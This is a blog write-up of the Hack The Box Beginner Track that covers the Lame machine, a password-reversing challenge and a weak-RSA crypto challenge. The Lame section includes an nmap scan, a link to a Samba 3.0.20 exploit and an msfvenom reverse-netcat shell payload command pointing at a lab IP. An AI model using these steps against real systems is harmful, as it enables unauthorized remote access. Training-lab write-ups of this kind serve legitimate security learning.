---
layout: single
title: Beginner Track - Hack The Box
excerpt: "We are gonna do Hack The Box Beginner Track , which consist on 10 challenges:
  * Lame
  * Find the easy pass
  * Weak RSA
  * Jerry
  * you know the 0xDiablos
  * Netmon
  * Under Construction
  * Blue
  * Like Tommy
  * Ropme"
date: 2021-12-15
classes: wide
header:
  teaser: assets/images/Beginner-Track/Beginner-Track-Logo.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - hackthebox
  - OSCP
tags:  
  - Beginner Track
  - easy
  -
---

![](/assets/images/Beginner-Track/Beginner-Track-Logo.png)

# Hack The Box - Beginner Track

We are going to Make Beginner Track from Hack The Box which has 4 machines and 6 challenges.


![](/assets/images/Beginner-Track/List-Path.png)

## Lame

Machine IP = 10.10.10.3

As always we start with init hack with is gonna well us determine which machine are we attacking as well as it is going to create the environment in which we are going to work.

![](/assets/images/Beginner-Track/pic1.png)

We can see that according we will be working against a **linux machine**. Now after doing some basic steps, We start by sending some nmaps commands to start checking the network:

  * nmap -sS -sV -sC -p- -vvv -oA nmap/allPorts 10.10.10.3


```
# Nmap 7.92 scan initiated Mon Nov 15 18:39:08 2021 as: nmap -sS -sV -sC -p- -vvv -oA allPorts 10.10.10.3
Nmap scan report for 10.10.10.3
Host is up, received echo-reply ttl 63 (0.080s latency).
Scanned at 2021-11-15 18:39:14 EST for 443s
Not shown: 65530 filtered tcp ports (no-response)
PORT     STATE SERVICE     REASON         VERSION
21/tcp   open  ftp         syn-ack ttl 63 vsftpd 2.3.4
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to 10.10.14.14
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      vsFTPd 2.3.4 - secure, fast, stable
|_End of status
22/tcp   open  ssh         syn-ack ttl 63 OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
| ssh-hostkey:
|   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)
| ssh-dss AAAAB3NzaC1kc3MAAACBALz4hsc8a2Srq4nlW960qV8xwBG0JC+jI7fWxm5METIJH4tKr/xUTwsTYEYnaZLzcOiy21D3ZvOwYb6AA3765zdgCd2Tgand7F0YD5UtXG7b7fbz99chReivL0SIWEG/E96Ai+pqYMP2WD5KaOJwSIXSUajnU5oWmY5x85sBw+XDAAAAFQDFkMpmdFQTF+oRqaoSNVU7Z+hjSwAAAIBCQxNKzi1TyP+QJIFa3M0oLqCVWI0We/ARtXrzpBOJ/dt0hTJXCeYisKqcdwdtyIn8OUCOyrIjqNuA2QW217oQ6wXpbFh+5AQm8Hl3b6C6o8lX3Ptw+Y4dp0lzfWHwZ/jzHwtuaDQaok7u1f971lEazeJLqfiWrAzoklqSWyDQJAAAAIA1lAD3xWYkeIeHv/R3P9i+XaoI7imFkMuYXCDTq843YU6Td+0mWpllCqAWUV/CQamGgQLtYy5S0ueoks01MoKdOMMhKVwqdr08nvCBdNKjIEd3gH6oBk/YRnjzxlEAYBsvCmM4a0jmhz0oNiRWlc/F+bkUeFKrBx/D2fdfZmhrGg==
|   2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)
|_ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEAstqnuFMBOZvO3WTEjP4TUdjgWkIVNdTq6kboEDjteOfc65TlI7sRvQBwqAhQjeeyyIk8T55gMDkOD0akSlSXvLDcmcdYfxeIF0ZSuT+nkRhij7XSSA/Oc5QSk3sJ/SInfb78e3anbRHpmkJcVgETJ5WhKObUNf1AKZW++4Xlc63M4KI5cjvMMIPEVOyR3AKmI78Fo3HJjYucg87JjLeC66I7+dlEYX6zT8i1XYwa/L1vZ3qSJISGVu8kRPikMv/cNSvki4j+qDYyZ2E5497W87+Ed46/8P42LNGoOV8OcX/ro6pAcbEPUdUEfkJrqi2YXbhvwIJ0gFMb6wfe5cnQew==
139/tcp  open  netbios-ssn syn-ack ttl 63 Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn syn-ack ttl 63 Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
3632/tcp open  distccd     syn-ack ttl 63 distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_smb2-security-mode: Couldn't establish a SMBv2 connection.
|_smb2-time: Protocol negotiation failed (SMB2)
| smb-os-discovery:
|   OS: Unix (Samba 3.0.20-Debian)
|   Computer name: lame
|   NetBIOS computer name:
|   Domain name: hackthebox.gr
|   FQDN: lame.hackthebox.gr
|_  System time: 2021-11-15T18:52:41-05:00
| p2p-conficker:
|   Checking for Conficker.C or higher...
|   Check 1 (port 59488/tcp): CLEAN (Timeout)
|   Check 2 (port 11770/tcp): CLEAN (Timeout)
|   Check 3 (port 33800/udp): CLEAN (Timeout)
|   Check 4 (port 40169/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
|_clock-skew: mean: 2h36m42s, deviation: 3h32m10s, median: 6m40s

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Nov 15 18:46:37 2021 -- 1 IP address (1 host up) scanned in 449.78 seconds


```
### Enumeration

I usually start by checking the port which I'm more comfortable and in this case it would be *ftp* (port 21).The nmap scan shows that ftp allows Anonymous login, but when we check the service we don't find anything interesting.

![](/assets/images/Beginner-Track/pic2.png)

the next thing that drives my attention is port 445 is running a **Samba 3.0.20** so I use searchsploit to see if there is any vulnerability on that exact  version.


![](/assets/images/Beginner-Track/pic3.png)


We can see that there are some possible exploits for *samba 3.0.20* but none of the search work for us because we are not going to use metasploit on this machine. We do the same search on google and we find a exploit that works on :

  * [https://github.com/macha97/exploit-smb-3.0.20/blob/master/exploit-smb-3.0.20.py](https://github.com/macha97/exploit-smb-3.0.20/blob/master/exploit-smb-3.0.20.py)

### Gaining Foothold

The only thing that we need to change in this exploit is the payload with the command that is showing on the exploit. On my case the command was :

  *  msfvenom -p cmd/unix/reverse_netcat LHOST=10.10.14.4 LPORT=443 -f python

![](/assets/images/Beginner-Track/pic4.png)  


Run the exploit and we are in as **root**

![](/assets/images/Beginner-Track/pic5.png)




## Find The Easy pass
This is an easy *reversing* challenge in which we will need to use **OllyDGB** which is a debbuging tool used to *analyze binary code* despite not having access to the source code. this tool is mostly used to evaluate and debug malware.

In this case I'm going to use a windows machine because in my case was a lot easier to use **OllyDGB** on a windows machine.
First, we need to download and unzip the file.

![](/assets/images/Beginner-Track/pic6.png)

When we run the program we can't see much about it, it just ask us for a password and when you enter the incorrect password it prompt the user with **Wrong password!**.

![](/assets/images/Beginner-Track/pic7.png)

Open *OllyDGB* and upload the .exe  to the program.

![](/assets/images/Beginner-Track/pic8.png)

We can see that everything is assembly language but after looking for a while on the program you can found that the there are some comments in ASCII characters (Human readable).

![](/assets/images/Beginner-Track/pic9.png)

We place a debug point exactly where we found the first ASCII comment, in this way we will be able to see how the flow of the program is going.

![](/assets/images/Beginner-Track/pic10.png)

We can see on the orange arrow the password we just entered (*hackthebox*) which prompts **Wrong password!**, but on the purple we can see a possible password  (fortran!).

We run the program again but in this case we try the *new password found* (fortran!) and we got **good job. Congratulations!**

![](/assets/images/Beginner-Track/pic11.png)


## Weak rsa
this is an easy *crypto challenge* in which we will need to use an specific tool to get the desired flag. RSA is an **asymetric cryptographic algorithm** this means it uses 2 keys for encryption

First we need to download and unzip the provided file.

![](/assets/images/Beginner-Track/pic12.png)

we find two files:

  * **flag.enc** = Encrypted file that contains the desired flag
  * **key.pub** = the public key that was used to encrypt the flag.encrypt

At the beginning of the challenge what I did was to use *openssl* to try to decrypt the flag, but after some time working on it nothing seems to work so I started to look for other alternatives.
I found an **RSA decryption utility** on  [GitHub](https://github.com/Ganapati/RsaCtfTool)

Install requirements run **RsaCtfTool** and at the end you can find the desired flag.

![](/assets/images/Beginner-Track/pic13.png)
